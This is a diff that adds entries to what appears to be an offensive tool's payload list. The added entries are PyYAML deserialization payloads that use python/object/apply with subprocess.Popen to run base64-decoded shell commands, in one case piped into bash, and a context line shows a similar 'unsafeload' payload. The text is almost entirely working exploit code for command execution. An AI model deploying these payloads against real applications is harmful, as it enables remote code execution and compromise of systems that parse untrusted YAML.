@@ -1408,6 +1408,26 @@ payload:
 
       {YAML_PY}
     - |
+      # Python3 (PyYAML #1)
+
+      !!python/object/apply:subprocess.Popen
+      - !!python/tuple
+        - python3
+        - -c
+        - "__import__('os').system(str(__import__('base64').b64decode('{BASE64_FULL}').decode()))"
+
+      {YAML_PY}
+    - |
+      # Python3 (PyYAML #2)
+
+      !!python/object/apply:subprocess.Popen
+      - !!python/tuple
+        - python3
+        - -c
+        - "__import__('os').system('echo {BASE64} | base64 -d | bash')"
+
+      {YAML_PY}
+    - |
       # Python (unsafeload)
       !!python/object/apply:subprocess.getoutput
         - echo {BASE64} | base64 -d | bash
